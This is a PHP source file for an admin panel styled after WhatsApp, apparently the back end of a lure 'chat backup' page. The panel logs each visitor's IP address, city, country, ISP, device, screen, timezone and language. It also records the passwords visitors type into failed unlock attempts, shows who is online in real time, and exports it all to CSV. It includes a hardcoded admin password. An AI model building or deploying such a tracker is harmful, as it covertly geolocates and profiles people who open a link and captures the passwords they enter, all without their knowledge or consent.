<?php
// ======================================================================
// WhatsApp Backup - Live Visitor & Telemetry Admin Dashboard
// ======================================================================

session_start();
header('X-Frame-Options: SAMEORIGIN');
header('X-Content-Type-Options: nosniff');

$ADMIN_PASSWORD = 'pradul'; // Master password to access dashboard
$logFile = __DIR__ . '/activity_logs.json';

// Logout Handler
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit;
}

// Login Handler
$loginError = false;
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_pw'])) {
    if ($_POST['admin_pw'] === $ADMIN_PASSWORD) {
        $_SESSION['admin_auth'] = true;
        header('Location: admin.php');
        exit;
    } else {
        $loginError = true;
    }
}

// Authentication Check
$isAuthed = !empty($_SESSION['admin_auth']);

// Helper: Read logs safely
function getLogsData($file) {
    if (!file_exists($file)) return [];
    $data = @file_get_contents($file);
    return json_decode($data, true) ?: [];
}

// Action: Clear Logs
if ($isAuthed && isset($_GET['action']) && $_GET['action'] === 'clear') {
    file_put_contents($logFile, json_encode([], JSON_PRETTY_PRINT));
    header('Location: admin.php');
    exit;
}

// Action: Export CSV
if ($isAuthed && isset($_GET['action']) && $_GET['action'] === 'export_csv') {
    $logs = getLogsData($logFile);
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="whatsapp_visitors_' . date('Y-m-d_His') . '.csv"');
    $out = fopen('php://output', 'w');
    fputcsv($out, ['ID', 'Date/Time', 'Name', 'Status', 'Attempted Password', 'IP Address', 'City', 'Country', 'ISP', 'Device', 'OS', 'Browser', 'Screen', 'Duration (Seconds)', 'Online Now']);
    foreach ($logs as $l) {
        $online = (!empty($l['isOnline']) && (time() - ($l['lastHeartbeat'] ?? 0)) < 60) ? 'YES' : 'NO';
        fputcsv($out, [
            $l['id'] ?? '',
            $l['createdAtFormatted'] ?? date('Y-m-d H:i:s', $l['createdAt'] ?? time()),
            $l['name'] ?? 'Unknown',
            $l['status'] ?? '',
            $l['attemptPw'] ?? '',
            $l['ip'] ?? '',
            $l['location']['city'] ?? '',
            $l['location']['country'] ?? '',
            $l['location']['isp'] ?? '',
            $l['telemetry']['deviceType'] ?? '',
            $l['telemetry']['os'] ?? '',
            $l['telemetry']['browser'] ?? '',
            $l['telemetry']['screen'] ?? '',
            $l['durationSeconds'] ?? 0,
            $online
        ]);
    }
    fclose($out);
    exit;
}

// Action: AJAX Data Feed for Live Auto-Refresh
if ($isAuthed && isset($_GET['ajax'])) {
    header('Content-Type: application/json');
    $logs = getLogsData($logFile);
    $now = time();
    $activeCount = 0;
    $successCount = 0;
    $failCount = 0;

    foreach ($logs as &$l) {
        $isLive = (!empty($l['isOnline']) && ($now - ($l['lastHeartbeat'] ?? 0)) < 60);
        $l['liveNow'] = $isLive;
        if ($isLive) $activeCount++;
        if (($l['status'] ?? '') === 'unlocked') $successCount++;
        if (($l['status'] ?? '') === 'failed') $failCount++;
    }

    echo json_encode([
        'ok' => true,
        'stats' => [
            'total' => count($logs),
            'activeNow' => $activeCount,
            'success' => $successCount,
            'failed' => $failCount,
        ],
        'logs' => $logs
    ]);
    exit;
}

// Compute initial stats for page load
$logs = $isAuthed ? getLogsData($logFile) : [];
$now = time();
$totalVisitors = count($logs);
$activeNow = 0;
$successLogins = 0;
$failedAttempts = 0;

foreach ($logs as $l) {
    if (!empty($l['isOnline']) && ($now - ($l['lastHeartbeat'] ?? 0)) < 60) {
        $activeNow++;
    }
    if (($l['status'] ?? '') === 'unlocked') $successLogins++;
    if (($l['status'] ?? '') === 'failed') $failedAttempts++;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>Visitor Tracker & Telemetry - WhatsApp Backup</title>
<style>
  :root {
    --bg-main: #0c1317;
    --bg-card: #111b21;
    --bg-header: #1f2c34;
    --bg-hover: #182229;
    --border: #222d34;
    --text-primary: #e9edef;
    --text-muted: #8696a0;
    --accent: #00a884;
    --accent-glow: rgba(0, 168, 132, 0.2);
    --danger: #f15c6d;
    --warning: #f7a531;
    --success: #00a884;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
  body { background: var(--bg-main); color: var(--text-primary); min-height: 100vh; padding: 18px 14px 40px; }

  /* Lock Screen (Admin Login) */
  .login-overlay {
    min-height: 85vh; display: flex; align-items: center; justify-content: center;
  }
  .login-box {
    background: var(--bg-card); border: 1px solid var(--border);
    border-radius: 16px; padding: 32px 28px; width: 100%; max-width: 380px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center;
  }
  .login-box h2 { font-size: 22px; margin-bottom: 8px; color: var(--text-primary); }
  .login-box p { font-size: 13.5px; color: var(--text-muted); margin-bottom: 22px; }
  .login-box input {
    width: 100%; background: #0c1317; border: 1px solid var(--border);
    border-radius: 10px; padding: 12px 14px; font-size: 15px; color: var(--text-primary);
    outline: none; margin-bottom: 14px; transition: border 0.2s;
  }
  .login-box input:focus { border-color: var(--accent); }
  .login-box button {
    width: 100%; background: var(--accent); color: #fff; border: none;
    border-radius: 10px; padding: 12px; font-size: 15px; font-weight: 600;
    cursor: pointer; transition: opacity 0.2s;
  }
  .login-box button:hover { opacity: 0.9; }
  .err-msg { color: var(--danger); font-size: 13px; margin-top: 12px; }

  /* Dashboard Header */
  .dash-container { max-width: 1200px; margin: 0 auto; }
  .top-nav {
    display: flex; align-items: center; justify-content: space-between;
    background: var(--bg-card); border: 1px solid var(--border);
    border-radius: 14px; padding: 14px 20px; margin-bottom: 20px;
    box-shadow: 0 4px 14px rgba(0,0,0,0.2);
  }
  .brand { display: flex; align-items: center; gap: 12px; }
  .brand-icon {
    width: 38px; height: 38px; border-radius: 10px;
    background: var(--accent); color: #fff; display: flex;
    align-items: center; justify-content: center; font-size: 18px; font-weight: 700;
  }
  .brand-title h1 { font-size: 18px; font-weight: 600; color: var(--text-primary); }
  .brand-title p { font-size: 12px; color: var(--text-muted); }

  .nav-actions { display: flex; align-items: center; gap: 10px; }
  .btn {
    background: var(--bg-header); border: 1px solid var(--border);
    color: var(--text-primary); border-radius: 8px; padding: 8px 14px;
    font-size: 13px; font-weight: 500; cursor: pointer; text-decoration: none;
    display: inline-flex; align-items: center; gap: 6px; transition: all 0.15s;
  }
  .btn:hover { background: var(--border); color: #fff; }
  .btn-accent { background: var(--accent); color: #fff; border: none; }
  .btn-accent:hover { background: #008f6f; }
  .btn-danger { background: rgba(241, 92, 109, 0.15); color: var(--danger); border-color: rgba(241, 92, 109, 0.3); }
  .btn-danger:hover { background: var(--danger); color: #fff; }

  /* Stat Widgets Grid */
  .stats-grid {
    display: grid; grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
    gap: 14px; margin-bottom: 22px;
  }
  .stat-card {
    background: var(--bg-card); border: 1px solid var(--border);
    border-radius: 14px; padding: 18px 20px; position: relative;
    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
  }
  .stat-card .label { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.6px; font-weight: 600; }
  .stat-card .value { font-size: 28px; font-weight: 700; color: var(--text-primary); margin: 6px 0 2px; }
  .stat-card .desc { font-size: 11.5px; color: var(--text-muted); }
  .stat-card.online .value { color: var(--accent); }
  .stat-card.danger .value { color: var(--danger); }

  .live-pulse {
    display: inline-block; width: 8px; height: 8px; border-radius: 50%;
    background: var(--accent); margin-right: 6px;
    box-shadow: 0 0 0 rgba(0, 168, 132, 0.7);
    animation: pulse 1.6s infinite;
  }
  @keyframes pulse {
    0% { box-shadow: 0 0 0 0 rgba(0, 168, 132, 0.7); }
    70% { box-shadow: 0 0 0 8px rgba(0, 168, 132, 0); }
    100% { box-shadow: 0 0 0 0 rgba(0, 168, 132, 0); }
  }

  /* Filter & Search Bar */
  .control-bar {
    display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between;
    gap: 12px; margin-bottom: 16px;
  }
  .search-box {
    flex: 1; min-width: 250px; background: var(--bg-card);
    border: 1px solid var(--border); border-radius: 10px;
    padding: 8px 14px; display: flex; align-items: center; gap: 8px;
  }
  .search-box input {
    flex: 1; background: transparent; border: none; outline: none;
    color: var(--text-primary); font-size: 14px;
  }
  .filter-group { display: flex; gap: 6px; flex-wrap: wrap; }
  .filter-pill {
    background: var(--bg-card); border: 1px solid var(--border);
    color: var(--text-muted); padding: 7px 14px; border-radius: 20px;
    font-size: 12.5px; cursor: pointer; transition: all 0.15s; font-weight: 500;
  }
  .filter-pill.active { background: var(--accent); color: #fff; border-color: var(--accent); }

  /* Live Refresh Indicator */
  .refresh-indicator {
    display: flex; align-items: center; gap: 8px; font-size: 12px; color: var(--text-muted);
  }
  .refresh-indicator select {
    background: var(--bg-card); border: 1px solid var(--border);
    color: var(--text-primary); border-radius: 6px; padding: 4px 8px; font-size: 12px;
  }

  /* Visitor Cards List */
  .visitor-list { display: flex; flex-direction: column; gap: 12px; }
  .v-card {
    background: var(--bg-card); border: 1px solid var(--border);
    border-radius: 14px; padding: 18px 20px; transition: transform 0.15s, border-color 0.15s;
    box-shadow: 0 3px 10px rgba(0,0,0,0.2);
  }
  .v-card:hover { border-color: rgba(0, 168, 132, 0.4); }
  .v-card.live-border { border-left: 4px solid var(--accent); }
  .v-card.failed-border { border-left: 4px solid var(--danger); }

  .v-head {
    display: flex; align-items: center; justify-content: space-between;
    flex-wrap: wrap; gap: 10px; margin-bottom: 12px;
  }
  .v-user { display: flex; align-items: center; gap: 12px; }
  .v-avatar {
    width: 42px; height: 42px; border-radius: 50%;
    background: #1f2c34; border: 1px solid var(--border);
    display: flex; align-items: center; justify-content: center;
    font-weight: 700; font-size: 17px; color: var(--accent);
  }
  .v-avatar.failed { color: var(--danger); }
  .v-name-box h3 { font-size: 16px; font-weight: 600; color: var(--text-primary); }
  .v-name-box .v-time { font-size: 12px; color: var(--text-muted); margin-top: 2px; }

  .status-badge {
    padding: 5px 12px; border-radius: 16px; font-size: 12px;
    font-weight: 600; display: inline-flex; align-items: center; gap: 6px;
  }
  .status-badge.online { background: rgba(0, 168, 132, 0.15); color: var(--accent); border: 1px solid rgba(0, 168, 132, 0.3); }
  .status-badge.offline { background: rgba(134, 150, 160, 0.12); color: var(--text-muted); border: 1px solid rgba(134, 150, 160, 0.2); }
  .status-badge.failed { background: rgba(241, 92, 109, 0.15); color: var(--danger); border: 1px solid rgba(241, 92, 109, 0.3); }

  /* Details Grid */
  .v-details {
    display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 12px; background: rgba(0,0,0,0.18); border-radius: 10px;
    padding: 12px 16px; margin-top: 8px; font-size: 13px;
  }
  .v-detail-item { display: flex; flex-direction: column; gap: 3px; }
  .v-detail-item .lbl { font-size: 11px; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.5px; }
  .v-detail-item .val { color: var(--text-primary); font-size: 13.5px; word-break: break-all; }
  .ip-chip {
    font-family: monospace; background: rgba(255,255,255,0.06);
    padding: 2px 6px; border-radius: 4px; font-size: 12.5px;
  }
  .duration-pill {
    font-weight: 700; color: var(--accent);
  }
  .attempt-pill {
    font-family: monospace; color: var(--danger); background: rgba(241, 92, 109, 0.1);
    padding: 2px 6px; border-radius: 4px; font-weight: 600;
  }

  .empty-state {
    text-align: center; padding: 60px 20px; color: var(--text-muted);
  }
  .empty-state svg { width: 56px; height: 56px; opacity: 0.3; margin-bottom: 12px; }

  @media(max-width: 600px) {
    body { padding: 10px 8px 30px; }
    .top-nav { flex-direction: column; align-items: flex-start; gap: 12px; }
    .nav-actions { width: 100%; justify-content: space-between; }
    .v-details { grid-template-columns: 1fr; }
  }
</style>
</head>
<body>

<?php if (!$isAuthed): ?>
<!-- ══════════ ADMIN LOGIN OVERLAY ══════════ -->
<div class="login-overlay">
  <div class="login-box">
    <h2>Tracker Dashboard</h2>
    <p>Enter master password to access visitor telemetries</p>
    <form method="POST">
      <input type="password" name="admin_pw" placeholder="Admin Password" autofocus required autocomplete="current-password">
      <button type="submit">Unlock Dashboard</button>
      <?php if ($loginError): ?>
        <div class="err-msg">Incorrect password. Please try again.</div>
      <?php endif; ?>
    </form>
  </div>
</div>

<?php else: ?>
<!-- ══════════ AUTHENTICATED DASHBOARD ══════════ -->
<div class="dash-container">
  
  <!-- Top Navigation -->
  <header class="top-nav">
    <div class="brand">
      <div class="brand-icon">W</div>
      <div class="brand-title">
        <h1>Visitor Telemetry & Live Tracker</h1>
        <p>Real-time monitor for WhatsApp Backup</p>
      </div>
    </div>
    <div class="nav-actions">
      <a href="index.html" target="_blank" class="btn">View Chat ↗</a>
      <a href="admin.php?action=export_csv" class="btn btn-accent">Export CSV</a>
      <button onclick="clearLogs()" class="btn btn-danger">Clear Logs</button>
      <a href="admin.php?logout=1" class="btn">Logout</a>
    </div>
  </header>

  <!-- Stat Cards -->
  <div class="stats-grid">
    <div class="stat-card">
      <div class="label">Total Visitors</div>
      <div class="value" id="stat-total"><?= number_format($totalVisitors) ?></div>
      <div class="desc">Unique & repeat entries</div>
    </div>
    <div class="stat-card online">
      <div class="label"><span class="live-pulse"></span>Live Online Now</div>
      <div class="value" id="stat-active"><?= number_format($activeNow) ?></div>
      <div class="desc">Active within last 60s</div>
    </div>
    <div class="stat-card">
      <div class="label">Unlocked Chat</div>
      <div class="value" id="stat-success"><?= number_format($successLogins) ?></div>
      <div class="desc">Valid password entered</div>
    </div>
    <div class="stat-card danger">
      <div class="label">Wrong Password</div>
      <div class="value" id="stat-failed"><?= number_format($failedAttempts) ?></div>
      <div class="desc">Failed unlock attempts</div>
    </div>
  </div>

  <!-- Search & Filter Controls -->
  <div class="control-bar">
    <div class="search-box">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" color="#8696a0"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
      <input type="text" id="search-input" placeholder="Search by name, IP, city, device..." oninput="filterLogs()">
    </div>
    <div class="filter-group">
      <button class="filter-pill active" onclick="setFilter('all', this)">All (<?= $totalVisitors ?>)</button>
      <button class="filter-pill" onclick="setFilter('online', this)">Online Now</button>
      <button class="filter-pill" onclick="setFilter('unlocked', this)">Unlocked</button>
      <button class="filter-pill" onclick="setFilter('failed', this)">Failed Attempts</button>
    </div>
    <div class="refresh-indicator">
      <span>Auto-refresh:</span>
      <select id="refresh-interval" onchange="setupAutoRefresh()">
        <option value="5000">Every 5s</option>
        <option value="10000" selected>Every 10s</option>
        <option value="30000">Every 30s</option>
        <option value="0">Off</option>
      </select>
      <button onclick="fetchLatestData()" class="btn" style="padding: 4px 10px;">↻</button>
    </div>
  </div>

  <!-- Visitor List Container -->
  <div class="visitor-list" id="logs-list">
    <!-- Populated via JavaScript dynamically -->
  </div>

</div>

<script>
let currentFilter = 'all';
let allLogs = <?= json_encode($logs) ?>;
let refreshTimer = null;

function formatDuration(sec) {
  if (!sec || sec < 0) return 'Just joined';
  const m = Math.floor(sec / 60);
  const s = sec % 60;
  if (m === 0) return s + 's';
  const h = Math.floor(m / 60);
  if (h === 0) return m + 'm ' + s + 's';
  return h + 'h ' + (m % 60) + 'm';
}

function timeAgo(epochSec) {
  const diff = Math.floor(Date.now() / 1000) - epochSec;
  if (diff < 15) return 'Just now';
  if (diff < 60) return diff + 's ago';
  const m = Math.floor(diff / 60);
  if (m < 60) return m + 'm ago';
  const h = Math.floor(m / 60);
  if (h < 24) return h + 'h ago';
  const d = Math.floor(h / 24);
  return d + 'd ago';
}

function renderLogs() {
  const container = document.getElementById('logs-list');
  const query = (document.getElementById('search-input').value || '').toLowerCase();
  const now = Math.floor(Date.now() / 1000);

  let filtered = allLogs.filter(l => {
    const isLive = (!emptyCheck(l.isOnline) && (now - (l.lastHeartbeat || 0)) < 60);
    if (currentFilter === 'online' && !isLive) return false;
    if (currentFilter === 'unlocked' && l.status !== 'unlocked') return false;
    if (currentFilter === 'failed' && l.status !== 'failed') return false;

    if (query) {
      const hay = [
        l.name || '',
        l.ip || '',
        l.location?.city || '',
        l.location?.country || '',
        l.location?.isp || '',
        l.telemetry?.os || '',
        l.telemetry?.browser || '',
        l.telemetry?.deviceType || '',
        l.attemptPw || ''
      ].join(' ').toLowerCase();
      if (!hay.includes(query)) return false;
    }
    return true;
  });

  if (filtered.length === 0) {
    container.innerHTML = `
      <div class="empty-state">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
        <p>No matching visitors found.</p>
      </div>`;
    return;
  }

  container.innerHTML = filtered.map(l => {
    const isLive = (!emptyCheck(l.isOnline) && (now - (l.lastHeartbeat || 0)) < 60);
    const duration = formatDuration(l.durationSeconds || (now - (l.createdAt || now)));
    const firstLetter = (l.name || 'U').charAt(0).toUpperCase();
    const city = l.location?.city || '';
    const country = l.location?.country || '';
    const locStr = (city && country) ? (city + ', ' + country) : (country || city || 'Unknown Location');
    const isFailed = l.status === 'failed';

    let statusHtml = '';
    if (isFailed) {
      statusHtml = `<span class="status-badge failed">⛔ Wrong Password (${esc(l.attemptPw || 'Unknown')})</span>`;
    } else if (isLive) {
      statusHtml = `<span class="status-badge online"><span class="live-pulse"></span>Online Now (${duration})</span>`;
    } else {
      statusHtml = `<span class="status-badge offline">⏱️ Active for ${duration}</span>`;
    }

    return `
      <div class="v-card ${isLive ? 'live-border' : (isFailed ? 'failed-border' : '')}">
        <div class="v-head">
          <div class="v-user">
            <div class="v-avatar ${isFailed ? 'failed' : ''}">${firstLetter}</div>
            <div class="v-name-box">
              <h3>${esc(l.name || 'Anonymous Visitor')}</h3>
              <div class="v-time">Entered: ${esc(l.createdAtFormatted || 'Unknown')} • ${timeAgo(l.createdAt || now)}</div>
            </div>
          </div>
          <div>${statusHtml}</div>
        </div>

        <div class="v-details">
          <div class="v-detail-item">
            <span class="lbl">IP Address & Network</span>
            <span class="val"><span class="ip-chip">${esc(l.ip || '0.0.0.0')}</span> ${l.location?.isp ? '• ' + esc(l.location.isp) : ''}</span>
          </div>

          <div class="v-detail-item">
            <span class="lbl">Location</span>
            <span class="val">📍 ${esc(locStr)}</span>
          </div>

          <div class="v-detail-item">
            <span class="lbl">Active Duration</span>
            <span class="val duration-pill">${isLive ? '🟢 Currently Active: ' + duration : '⏱️ Total Active Time: ' + duration}</span>
          </div>

          <div class="v-detail-item">
            <span class="lbl">Device & System</span>
            <span class="val">${l.telemetry?.deviceType === 'Mobile' ? '📱' : '💻'} ${esc(l.telemetry?.os || 'Unknown OS')} • ${esc(l.telemetry?.browser || 'Browser')}</span>
          </div>

          <div class="v-detail-item">
            <span class="lbl">Screen & Viewport</span>
            <span class="val">${esc(l.telemetry?.screen || '—')} (Viewport: ${esc(l.telemetry?.viewport || '—')})</span>
          </div>

          <div class="v-detail-item">
            <span class="lbl">Timezone & Language</span>
            <span class="val">🕒 ${esc(l.telemetry?.timezone || '—')} • ${esc(l.telemetry?.language || '—')}</span>
          </div>
        </div>
      </div>
    `;
  }).join('');
}

function emptyCheck(val) {
  return val === true || val === 'true' || val === 1 || val === '1';
}

function esc(str) {
  const d = document.createElement('div');
  d.textContent = str;
  return d.innerHTML;
}

function setFilter(filter, btn) {
  currentFilter = filter;
  document.querySelectorAll('.filter-pill').forEach(p => p.classList.remove('active'));
  btn.classList.add('active');
  renderLogs();
}

function filterLogs() {
  renderLogs();
}

async function fetchLatestData() {
  try {
    const res = await fetch('admin.php?ajax=1');
    const data = await res.json();
    if (data && data.ok) {
      allLogs = data.logs || [];
      document.getElementById('stat-total').textContent = (data.stats.total || 0).toLocaleString();
      document.getElementById('stat-active').textContent = (data.stats.activeNow || 0).toLocaleString();
      document.getElementById('stat-success').textContent = (data.stats.success || 0).toLocaleString();
      document.getElementById('stat-failed').textContent = (data.stats.failed || 0).toLocaleString();
      renderLogs();
    }
  } catch (e) {}
}

function setupAutoRefresh() {
  if (refreshTimer) clearInterval(refreshTimer);
  const ms = parseInt(document.getElementById('refresh-interval').value, 10);
  if (ms > 0) {
    refreshTimer = setInterval(fetchLatestData, ms);
  }
}

function clearLogs() {
  if (confirm('Are you sure you want to permanently delete all visitor activity logs?')) {
    window.location.href = 'admin.php?action=clear';
  }
}

// Initial render & auto-refresh setup
renderLogs();
setupAutoRefresh();
</script>
<?php endif; ?>

</body>
</html>
